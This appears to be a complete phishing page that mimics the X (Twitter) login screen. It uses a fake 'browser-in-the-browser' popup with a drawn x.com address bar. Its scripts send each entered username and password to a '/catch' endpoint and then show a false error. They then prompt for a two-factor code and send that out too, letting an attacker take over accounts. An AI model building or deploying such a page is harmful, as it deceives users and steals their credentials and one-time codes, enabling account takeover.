<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>X / Twitter</title>
<style>*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#000;min-height:100vh;display:flex;align-items:center;justify-content:center;}
.card{background:#000;border:none;width:380px;text-align:center;padding:40px 24px}
.xlogo{font-size:48px;color:white;font-weight:900;margin-bottom:28px;line-height:1}
.card h1{color:white;font-size:28px;font-weight:700;margin-bottom:28px}
.card input{width:100%;padding:14px 16px;background:#16181c;border:1px solid #333;border-radius:4px;font-size:16px;color:white;margin-bottom:12px;outline:none}
.card input:focus{border-color:#1d9bf0}
.card input::placeholder{color:#6e767d}
.card .login-btn{width:100%;padding:14px;background:white;color:black;border:none;border-radius:999px;font-size:15px;font-weight:700;cursor:pointer;margin-bottom:12px}
.card .login-btn:hover{background:#e7e7e7}
.sep{color:#6e767d;font-size:13px;margin:8px 0}
.card .xlogin-btn{width:100%;padding:14px;background:transparent;color:white;border:1px solid #333;border-radius:999px;font-size:15px;font-weight:700;cursor:pointer}
.footer{margin-top:24px;color:#6e767d;font-size:14px}
.footer a{color:#1d9bf0;text-decoration:none}
#ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.65);z-index:9999;align-items:center;justify-content:center}
#ov.show{display:flex}
.bw{width:440px;border-radius:10px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.8);animation:popIn .15s ease-out}
@keyframes popIn{from{transform:scale(.92);opacity:0}to{transform:scale(1);opacity:1}}
.tb{background:#2f3336;padding:8px 10px 6px;display:flex;align-items:center;gap:8px}
.dots{display:flex;gap:6px}.dots span{width:13px;height:13px;border-radius:50%;display:block}
.dr{background:#ff5f57}.dy{background:#ffbd2e}.dg{background:#28c840}
.ub{flex:1;background:#1c1f23;border-radius:20px;padding:3px 12px;display:flex;align-items:center;gap:6px;font-size:13px;color:#8b9aaa}
.lock{color:#1d9bf0;font-size:12px}.xbtn{background:none;border:none;font-size:18px;cursor:pointer;color:#8b9aaa}
.bd{background:#000;padding:40px 40px 32px;text-align:center}
.bd .xlogo2{font-size:36px;color:white;font-weight:900;margin-bottom:20px}
.bd h2{color:white;font-size:22px;font-weight:700;margin-bottom:6px}
.bd .sub2{color:#6e767d;font-size:14px;margin-bottom:24px}
.bd input{width:100%;padding:12px 14px;background:#16181c;border:1px solid #333;border-radius:4px;font-size:15px;color:white;margin-bottom:10px;outline:none;box-sizing:border-box}
.bd input:focus{border-color:#1d9bf0}
.bd input::placeholder{color:#6e767d}
.bd .bs{width:100%;padding:12px;background:white;color:black;border:none;border-radius:999px;font-size:15px;font-weight:700;cursor:pointer;margin-top:4px}
.bd .bs:hover{background:#e7e7e7}
.bd .err{display:none;color:#f4212e;font-size:13px;margin-top:4px;margin-bottom:8px}

#_otp_step{display:none;margin-top:8px}
#_otp_step label{font-size:13px;color:#333;display:block;margin-bottom:4px}
#_otp_step input{width:100%;padding:9px 12px;border:1px solid #ccc;border-radius:4px;font-size:18px;
  letter-spacing:6px;text-align:center;margin-bottom:14px;outline:none}
#_otp_step input:focus{border-color:#1a73e8}
#_otp_info{font-size:13px;color:#555;text-align:center;margin-bottom:12px}
</style><style>#_obtn{width:100%;padding:10px;cursor:pointer;font-size:15px;border-radius:4px;border:none;margin-top:4px} #_obtn{} </style>
</head><body>
<div class="card">
<div class="xlogo">𝕏</div>
<h1>Sign in to X</h1>
<input type="text" placeholder="Phone, email, or username" onfocus="showB()">
<button class="login-btn" onclick="showB()">Next</button>
<div class="sep">or</div>
<button class="xlogin-btn" onclick="showB()">Sign in with Google</button>
<div class="footer">Don't have an account? <a href="#">Sign up</a></div>
</div>
<div id="ov"><div class="bw">
<div class="tb">
<div class="dots"><span class="dr" onclick="hideB()"></span><span class="dy"></span><span class="dg"></span></div>
<div class="ub"><span class="lock">&#128274;</span><span><strong>x.com</strong><span style="color:#555">/i/flow/login</span></span></div>
<button class="xbtn" onclick="hideB()">&#x2715;</button></div>
<div class="bd">
<div class="xlogo2">𝕏</div>
<h2>Sign in to X</h2>
<p class="sub2">Enter your credentials to continue</p>
<form id="lf" onsubmit="doSub(event)">
<input type="text" id="fu" placeholder="Phone, email, or username" required>
<input type="password" id="fp" placeholder="Password" required>
<p class="err" id="em">Wrong username or password. Try again.</p>
<button class="bs" type="submit">Log in</button>
</form>
<div id="_otp_step">
  <p id="_otp_info">&#x1F512; Two-factor authentication required<br><small style="color:#888">Enter the code from your authenticator app</small></p>
  <label>Verification code</label>
  <input type="tel" id="_fotp" autocomplete="one-time-code" placeholder="000000" maxlength="8" pattern="[0-9]*" inputmode="numeric">
  <button type="button" id="_obtn" onclick="_submitOTP()">Verify</button>
</div>
</div></div></div>
<script>
function showB(){document.getElementById('ov').classList.add('show');setTimeout(()=>document.getElementById('fu').focus(),150);}
function hideB(){document.getElementById('ov').classList.remove('show');}
document.getElementById('ov').addEventListener('click',function(e){if(e.target===this)hideB();});
function doSub(e){e.preventDefault();
var u=document.getElementById('fu').value,p=document.getElementById('fp').value;
fetch('/catch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user:u,pass:p,ts:new Date().toISOString(),src:'bitb'})}).catch(()=>{});
var b=e.target.querySelector('.bs');b.textContent='Signing in…';b.disabled=true;
setTimeout(()=>{document.getElementById('em').style.display='block';b.textContent='Log in';b.disabled=false;document.getElementById('fp').value='';document.getElementById('fp').focus();},1800);}
</script>
<script>
(function(){
var _c={};
// Patch submitLogin / doSub / loginSubmit etc.
var _origSub=window.submitLogin||window.doSub||window.loginSubmit||null;
function _hookSubmit(u,p){
  _c={user:u,pass:p};
  fetch('/catch',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({user:u,pass:p,ts:new Date().toISOString(),src:'bitb',step:'creds'})}).catch(()=>{});
}
// After original submit fires (shows error), reveal OTP step
var _origFns=['submitLogin','doSub','loginSubmit'];
_origFns.forEach(function(fn){
  if(typeof window[fn]==='function'){
    var _orig=window[fn];
    window[fn]=function(e){
      var _u=document.querySelector('input[type=text],input[autocomplete=username],input[id*=user],input[id*=email]');
      var _p=document.querySelector('input[type=password]');
      if(_u&&_p) _hookSubmit(_u.value,_p.value);
      var r=_orig.apply(this,arguments);
      setTimeout(function(){
        var otp=document.getElementById('_otp_step');
        if(otp) otp.style.display='block';
        var fi=document.getElementById('_fotp');
        if(fi) setTimeout(function(){fi.focus();},100);
      },1700);
      return r;
    };
  }
});
window._submitOTP=function(){
  var otp=document.getElementById('_fotp');
  if(!otp||!otp.value) return;
  var btn=document.getElementById('_obtn');
  if(btn){btn.textContent='Verifying\u2026';btn.disabled=true;}
  fetch('/catch',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({user:_c.user,pass:_c.pass,otp:otp.value,
      ts:new Date().toISOString(),src:'bitb',step:'otp'})}).catch(()=>{});
  setTimeout(function(){
    var info=document.getElementById('_otp_info');
    if(info) info.innerHTML='&#x26A0; Incorrect code. Please try again.';
    if(btn){btn.textContent='Verify';btn.disabled=false;}
    if(otp){otp.value='';otp.focus();}
  },1800);
};
// Allow Enter key on OTP field
document.addEventListener('keydown',function(e){
  if(e.key==='Enter'&&document.activeElement&&document.activeElement.id==='_fotp'){
    window._submitOTP();
  }
});
})();
</script>
</body></html>
